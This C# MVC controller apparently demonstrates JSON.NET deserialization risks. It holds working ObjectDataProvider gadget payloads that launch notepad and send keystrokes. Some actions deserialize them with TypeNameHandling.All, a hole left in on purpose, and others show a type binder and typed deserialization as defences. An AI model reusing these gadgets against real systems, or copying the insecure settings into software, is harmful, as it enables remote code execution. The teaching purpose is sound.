using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using System.Web.Mvc;
using JsonDeserialization5.Models;
using Newtonsoft.Json;

namespace JsonDeserialization5.Controllers
{
    public class HomeController : Controller
    {
        const string RemoteExecutionPayload = @"
            {
                '$type': 'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
                'MethodName': 'Start',
                'MethodParameters':
                {
                    '$type': 'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                    '$values': [ 'notepad' ]
                },
                'ObjectInstance':
                {
                    '$type': 'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
                }
            }";

        const string RemoteExecutionTyperPayload = @"
            {
                '$type': 'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
                'MethodName': 'SendWait',
                'MethodParameters':
                {
                    '$type': 'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                    '$values': [ 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.' ]
                },
                'ObjectInstance':
                {
                    '$type': 'System.Windows.Forms.SendKeys, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
                }
            }";

        public ActionResult Home()
        {
            return View();
        }

        public ActionResult SecureDeserialization()
        {
            try
            {
                var obj = JsonConvert.DeserializeObject(RemoteExecutionTyperPayload, new JsonSerializerSettings
                {
                    SerializationBinder = new KnownTypesBinder(),
                    TypeNameHandling = TypeNameHandling.Auto
                });
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.ToString());
            }

            return View();
        }

        public ActionResult InsecureDeserialization()
        {
            var obj = JsonConvert.DeserializeObject(RemoteExecutionPayload, new JsonSerializerSettings
            {
                TypeNameHandling = TypeNameHandling.All
            });

            return View();
        }

        public ActionResult InsecureDeserializationList()
        {
            var data = new List<string> { RemoteExecutionPayload, RemoteExecutionTyperPayload };

            foreach (var json in data)
            {
                var obj = JsonConvert.DeserializeObject(json, new JsonSerializerSettings
                {
                    TypeNameHandling = TypeNameHandling.All
                });

                Thread.Sleep(1000);
            }

            return View();
        }

        public ActionResult TypeSafeDeserialization()
        {
            try
            {
                var obj = JsonConvert.DeserializeObject<TestModel>(RemoteExecutionPayload, new JsonSerializerSettings
                {
                    TypeNameHandling = TypeNameHandling.All
                });
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.ToString());
            }

            return View();
        }
    }
}